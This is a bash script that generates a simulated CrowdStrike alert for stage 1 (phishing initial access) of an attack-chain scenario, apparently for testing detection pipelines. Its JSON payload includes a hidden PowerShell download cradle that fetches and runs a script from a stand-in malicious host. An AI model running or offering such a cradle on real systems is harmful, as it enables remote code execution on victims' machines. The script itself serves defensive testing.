#!/usr/bin/env bash
# =============================================================================
# Scenario: Lateral Movement to Exfiltration — Stage 1: Initial Access
# =============================================================================
# MITRE ATT&CK: T1566 — Phishing
# Tactic:     Initial Access
# Severity:   HIGH
#
# What this simulates:
#   A user clicking a phishing link that downloads and executes a PowerShell
#   payload via IEX (Invoke-Expression). This is the entry point of the
#   8-stage attack chain.
#
# Detection signals:
#   - Command line: powershell -nop -w hidden -c "IEX(...DownloadString...)"
#   - This is a classic download cradle — highly suspicious
#
# Part of: lateral attack chain (stages 1-8)
# =============================================================================

SCENARIO_NAME="lateral_to_exfil"
SCENARIO_STAGE=1
SCENARIO_STAGE_NAME="Initial Access"
SCENARIO_SOURCE="crowdstrike"
SCENARIO_SEVERITY="HIGH"
SCENARIO_TACTIC="Initial Access"
SCENARIO_TECHNIQUE="T1566"

TIMESTAMP=$(date +%s)
DETECT_ID="cs-stage1-${TIMESTAMP}"

# build_payload — Generate the CrowdStrike-format alert payload for stage 1.
# Args: $1: tenant_id (default: "default-tenant")
# Output: JSON payload to stdout
build_payload() {
    local tenant_id="${1:-default-tenant}"
    cat <<EOF
{
    "detect_id": "${DETECT_ID}",
    "customer_id": "${tenant_id}",
    "timestamp": ${TIMESTAMP},
    "sensor": {
        "hostname": "win-workstation-01"
    },
    "process": {
        "user_name": "CORP\\\\attacker",
        "file_name": "outlook.exe",
        "command_line": "powershell -nop -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')\"",
        "sha256": "0000000000000000000000000000000000000000000000000000000000000001"
    },
    "tactic": "${SCENARIO_TACTIC}",
    "technique": "${SCENARIO_TECHNIQUE}",
    "severity": "${SCENARIO_SEVERITY}"
}
EOF
}
